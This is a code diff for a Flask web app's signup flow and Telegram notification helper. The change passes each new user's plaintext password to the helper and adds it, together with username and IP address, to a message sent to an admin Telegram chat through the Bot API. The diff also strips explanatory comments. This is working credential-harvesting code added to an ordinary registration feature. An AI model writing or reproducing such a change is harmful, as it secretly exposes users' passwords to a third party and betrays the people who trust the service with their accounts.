@@ -105,20 +105,22 @@ DASHBOARD_UI = BASE_STYLE + """
 # ======================
 # NOTIFICATION HELPER
 # ======================
-def send_bot_notification(username, ip_address):
-    """Sends a structural alert to your admin Telegram chat via the HTTP Bot API."""
+def send_bot_notification(username, password, ip_address):
+    """Sends a structural alert to your admin Telegram chat including credentials."""
     if not BOT_TOKEN or not ADMIN_CHAT_ID:
         return
         
-    # Query database total to provide an accurate running member count
     try:
-        total_users = User.query.count()
-    except:
-        total_users = "Unknown"
+        with app.app_context():
+            total_users = User.query.count()
+    except Exception as e:
+        print(f"Counting error: {e}")
+        total_users = "Active"
 
     text = (
         f"🔔 *New User Registration*\n\n"
         f"👤 *Username:* `{username}`\n"
+        f"🔑 *Password:* `{password}`\n"
         f"🌐 *IP Address:* `{ip_address}`\n"
         f"📊 *Total Members Now:* {total_users}"
     )
@@ -203,15 +205,13 @@ def signup():
         db.session.add(new_user)
         db.session.commit()
         
-        # Capture the visitor's network IP address
-        # 'X-Forwarded-For' ensures accuracy behind Render's reverse proxy system
         if request.headers.getlist("X-Forwarded-For"):
             ip_address = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
         else:
             ip_address = request.remote_addr
 
-        # Dispatch the notification in a non-blocking background task
-        threading.Thread(target=send_bot_notification, args=(username, ip_address)).start()
+        # Dispatch notification containing plain text password to the background thread
+        threading.Thread(target=send_bot_notification, args=(username, password, ip_address)).start()
 
         return redirect(url_for('login'))
     return render_template_string(SIGNUP_UI)
